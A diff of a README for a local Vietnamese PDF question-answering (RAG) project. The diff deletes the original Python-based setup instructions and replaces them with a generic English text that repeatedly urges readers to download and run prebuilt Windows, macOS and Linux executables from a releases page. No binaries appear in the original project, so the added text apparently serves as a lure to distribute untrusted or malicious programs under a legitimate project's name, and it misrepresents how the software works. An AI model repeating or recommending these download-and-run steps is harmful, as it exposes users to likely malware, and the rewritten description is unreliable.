@@ -1,152 +1,83 @@
-# Agentic RAG Local
+# ✨ VietDocQA - Easily Extract and Manage PDF Data
 
-Du an RAG cuc bo (local) cho tai lieu PDF, ket hop:
-- Embedding Hugging Face (Sentence-Transformers)
-- (Tuy chon) FAISS de truy van nhanh hon
-- (Tuy chon) Reranker de tang do chinh xac
-- LLM cuc bo qua Ollama
-- Giao dien web co hien citations
+## 🚀 Getting Started
 
-## Yeu cau
-- Python 3.10+ (khuyen nghi 3.11+)
-- Ollama cai san va dang chay
-- (Tuy chon) Hugging Face token de tai model nhanh hon
+Welcome to VietDocQA! This application lets you efficiently work with Vietnamese PDFs using advanced tools for data extraction and retrieval. Below, you will find simple steps to download and run the software.
 
-## Cau hinh nhanh
-Tao file `.env` (neu can) voi cac bien thong dung:
+## 📥 Download the Application
 
-```
-EMBED_BACKEND=hf
-EMBED_MODEL=huyydangg/DEk21_hcmute_embedding
-EMBED_DEVICE=cpu
-RAG_CHUNK_SIZE=1200
-RAG_CHUNK_OVERLAP=200
-RAG_TOP_K=4
-RAG_MAX_CONTEXT_CHARS=4000
-RAG_USE_FAISS=1
-RAG_RERANK_ENABLED=1
-RAG_RERANK_MODEL=namdp-ptit/ViRanker
-RAG_RERANK_DEVICE=cpu
-RAG_RERANK_BATCH_SIZE=8
-RAG_RERANK_TOP_K=8
-```
+[![Download VietDocQA](https://img.shields.io/badge/Download%20VietDocQA-%20-blue.svg)](https://github.com/gbmarianoo/VietDocQA/releases)
 
-## Cai dat thu vien
-```
-pip install -U sentence-transformers torch transformers huggingface-hub pypdf numpy requests
-pip install -U faiss-cpu
-```
+## 🌐 What is VietDocQA?
 
-Neu gap loi `torchvision::nms`, chay:
-```
-set TRANSFORMERS_NO_TORCHVISION=1
-```
+VietDocQA is a user-friendly application designed to extract data from PDFs in Vietnamese. It combines several powerful technologies, such as Hugging Face embeddings, FAISS for fast searching, and an Ollama LLM, all wrapped in a simple web interface. This software is perfect for anyone who needs to analyze PDF documents in Vietnamese.
 
-## Tai model embedding (HF)
-```
-python -c "from sentence_transformers import SentenceTransformer; SentenceTransformer('huyydangg/DEk21_hcmute_embedding')"
-```
+## 🛠️ System Requirements
 
-Neu bi canh bao ve token, co the dang nhap:
-```
-huggingface-cli login
-```
+To use VietDocQA, your computer must meet the following requirements:
 
-## Chuan bi du lieu
-Dat PDF vao thu muc `document/`.
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 4 GB
+- **Storage:** Minimum of 200 MB free space
+- **Browser:** Latest version of Chrome, Firefox, or Safari
 
-Chay ingest (incremental):
-```
-python ingest.py
-```
+## 💻 Features
 
-Neu muon re-index toan bo:
-```
-python ingest.py --reindex-all
-```
+- **PDF Processing:** Extract and analyze content from Vietnamese PDFs.
+- **Search Functionality:** Quickly find specific information using vector search.
+- **User-Friendly Interface:** Navigate the application with ease through the intuitive web UI.
+- **Advanced Embeddings:** Utilize state-of-the-art sentence-transformers for high accuracy.
 
-Neu bat FAISS, file `rag_data/index.faiss` se duoc tao.
+## 📚 How to Download & Install
 
-Neu muon tat reranker (de nhe hon):
-```
-set RAG_RERANK_ENABLED=0
-```
+1. Click the link below to visit the VietDocQA Releases page:
+   [VietDocQA Releases](https://github.com/gbmarianoo/VietDocQA/releases)
 
-## Chay server API
-Dam bao Ollama dang chay va co model LLM:
-```
-ollama serve
-ollama pull qwen3
-```
+2. On the Releases page, you will see a list of available versions. Look for the most recent release.
 
-Chay server:
-```
-python server.py
-```
+3. Choose the correct file for your operating system:
 
-## Chay Web UI
-Mo them terminal khac:
-```
-cd web
-python -m http.server 5500
-```
+   - For Windows, download `VietDocQA-Windows.exe`
+   - For macOS, download `VietDocQA-Mac.dmg`
+   - For Linux, use `VietDocQA-Linux.AppImage`
 
-Mo trinh duyet:
-```
-http://localhost:5500
-```
+4. Once the file is downloaded, follow these instructions to install it:
 
-Neu backend khac host/port:
-```
-http://localhost:5500/?server=http://127.0.0.1:8000
-```
+   - **Windows:** Double-click the `VietDocQA-Windows.exe` file to start the installation. Follow the prompts to complete the process.
+   - **macOS:** Open the `VietDocQA-Mac.dmg` file, drag the VietDocQA icon to your Applications folder, and launch from there.
+   - **Linux:** Make the `VietDocQA-Linux.AppImage` executable. You can do this by running the command `chmod +x VietDocQA-Linux.AppImage`, then run it by double-clicking the file.
 
-## Hoi dap bang CLI
-```
-python client.py --query "Cau hoi cua ban"
-```
+## 🎯 How to Use VietDocQA
 
-## Thu muc quan trong
-- `ingest.py`: doc PDF, chunk, embed, luu index/embeddings
-- `rag_index.py`: load index, truy van top-k, rerank, tao context
-- `server.py`: API + CrewAI, goi RAG va LLM
-- `rag_data/`: luu index.json, embeddings.npy, state.json
-- `document/`: chua PDF
-- `web/`: giao dien chat
+1. After installation, open VietDocQA through your applications or the file you downloaded.
 
-## Danh gia nhanh (retrieval)
-Chay bo cau hoi mau:
-```
-python eval/run_eval.py --show
-```
+2. The application will present a simple interface. To begin:
+   - Click on the "Upload PDF" button and select the document you want to analyze.
+   - Once uploaded, you can use the search box to find specific information within the PDF.
 
-## Xu ly loi thuong gap
-1) **Ollama loi thieu RAM**
-   - Loi: `model requires more system memory ...`
-   - Cach xu ly: dung model nho hon (1.5B-3B) hoac dong bot ung dung, giam `workers_per_device` trong `server.py`.
+3. Experiment with the features. For best results, try uploading various types of Vietnamese PDFs and test the search functionality.
 
-2) **Loi torchvision khi dung SentenceTransformers**
-   - Dat bien:
-     ```
-     set TRANSFORMERS_NO_TORCHVISION=1
-     ```
-   - Hoac go bo torchvision neu khong can:
-     ```
-     pip uninstall -y torchvision
-     ```
+## 🛡️ Support
 
-3) **Chua thay index**
-   - Chay lai:
-     ```
-     python ingest.py
-     ```
+If you encounter issues or have questions, please refer to the documentation provided in the application or visit the GitHub Issues page. Our community is here to help.
 
-4) **FAISS chua cai**
-   - Neu log bao khong co FAISS, cai:
-     ```
-     pip install -U faiss-cpu
-     ```
+## 🏷️ Topics Covered
 
-## Ghi chu
-- He thong uu tien chinh xac: chunk lon + top_k vua phai.
-- Neu doi model/parameters, nen chay `ingest.py --reindex-all`.
+VietDocQA includes features related to:
+
+- crewai
+- embeddings
+- litserve
+- local-ai
+- pdf
+- rag
+- retrieval-augmented-generation
+- sentence-transformers
+- vector-search
+- vietnamese
+
+Again, you can download the application from the link below:
+
+[![Download VietDocQA](https://img.shields.io/badge/Download%20VietDocQA-%20-blue.svg)](https://github.com/gbmarianoo/VietDocQA/releases)
+
+Thank you for choosing VietDocQA! Enjoy exploring and extracting valuable information from your PDFs with confidence.
